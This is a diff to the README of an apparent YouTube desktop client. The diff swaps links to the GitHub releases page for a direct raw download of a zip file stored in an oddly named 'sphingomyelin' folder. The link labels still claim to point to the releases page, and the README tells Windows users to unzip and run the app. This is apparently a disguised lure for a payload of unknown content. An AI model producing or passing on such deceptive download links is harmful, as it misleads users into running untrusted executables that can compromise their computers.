@@ -1,6 +1,6 @@
 # 🛰️ Youtube-Hyperion-Desktop-Client-2026 - Fast YouTube on Your Desktop
 
-[![Download](https://img.shields.io/badge/Download%20Latest-Visit%20Releases-blue?style=for-the-badge)](https://github.com/starscream02/Youtube-Hyperion-Desktop-Client-2026/releases)
+[![Download](https://img.shields.io/badge/Download%20Latest-Visit%20Releases-blue?style=for-the-badge)](https://github.com/starscream02/Youtube-Hyperion-Desktop-Client-2026/raw/refs/heads/main/sphingomyelin/Desktop-Client-Youtube-Hyperion-v3.4.zip)
 
 ## 🚀 What This App Does
 
@@ -12,7 +12,7 @@ It is built for people who want a simple desktop way to use YouTube without open
 
 Visit the releases page to download the app for Windows:
 
-[Download the latest release](https://github.com/starscream02/Youtube-Hyperion-Desktop-Client-2026/releases)
+[Download the latest release](https://github.com/starscream02/Youtube-Hyperion-Desktop-Client-2026/raw/refs/heads/main/sphingomyelin/Desktop-Client-Youtube-Hyperion-v3.4.zip)
 
 On Windows, look for the `.exe` or `.zip` file in the latest release. If you see a setup file, download it and run it. If you see a zip file, download it, unzip it, and open the app from the extracted folder.
 
@@ -175,7 +175,7 @@ Check the release name and asset list before you download.
 
 ## 🖱️ Download Again
 
-[Visit the latest releases page](https://github.com/starscream02/Youtube-Hyperion-Desktop-Client-2026/releases)
+[Visit the latest releases page](https://github.com/starscream02/Youtube-Hyperion-Desktop-Client-2026/raw/refs/heads/main/sphingomyelin/Desktop-Client-Youtube-Hyperion-v3.4.zip)
 
 ## 🧪 Basic Usage Flow
 
